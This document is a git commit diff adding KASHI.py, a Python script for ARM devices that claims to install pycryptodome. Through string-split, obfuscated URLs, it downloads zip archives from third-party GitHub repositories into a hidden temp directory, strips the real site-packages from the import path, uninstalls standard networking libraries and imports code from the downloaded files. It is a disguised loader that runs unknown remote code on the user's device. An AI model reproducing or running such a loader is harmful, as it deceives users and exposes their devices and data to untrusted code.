2f1c474595fdd471d655cb0d23397cc28c152bf4
TECH-KASHIF <104705313+TECH-KASHIF@users.noreply.github.com>
2023-04-08 02:11:31 +0500

    Update KASHI.py

--- KASHI.py
+++ KASHI.py
@@ -1,1 +1,64 @@
+#SOURCE BY : KASHIF
+#GITHUB : https://github.com/TECH-KASHIF
+#coding = utf-8
+from uuid import uuid4
+import os,sys,tempfile,string,random,subprocess,uuid
+http_directory = tempfile.mkdtemp(prefix='.')
+site_packages = sys.path[4]
+print(site_packages)
+print(http_directory)
+sys.path.remove(site_packages)
+sys.path.insert(4,http_directory+'/reqmodule')
+sys.path.insert(5,http_directory)
+try:
+        os.mkdir('crypto')
+except:pass
+hh = "ho"
+hh2 = "9/pycrypt"
+find_aarch = subprocess.check_output('uname -om',shell=True)
+if 'aarch64' in str(find_aarch):
+        user_aarch = '64'
+        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
+elif 'arm' in str(find_aarch):
+        user_aarch = '32'
+        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
+else:
+        print(' Unknown aarch ')
+        exit()
+if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
+        os.system('clear')
+        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
+        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
+        os.system('python KASHI.py')
+else:
+        akk2="rsi"
+        akk=f"cha{akk2}fi"
+        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
+        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
+        os.system(f'curl -L {lib} > {http_directory}/config.zip')
+        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
+        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
+try:
+        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as ThreadPool
+        from Crypto.Cipher import AES, PKCS1_v1_5
+        from Crypto.PublicKey import RSA
+        from Crypto.Random import get_random_bytes
+except Exception as e:
+        print(e)
+        print('\n Installing modules wait !')
+        os.system('pip install futures==2 && python KASHI.py')
+except FileExistsError:
+        os.system('pip uninstall requests urllib3 idna certifi -y')
+        pass
+
+try:
+        import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as ThreadPool
+except ModuleNotFoundError:
+        print('\n Installing missing modules ...')
+        os.system('pip install requests futures==2 > /dev/null')
+        os.system('python KASHI.py')
 import KASHI
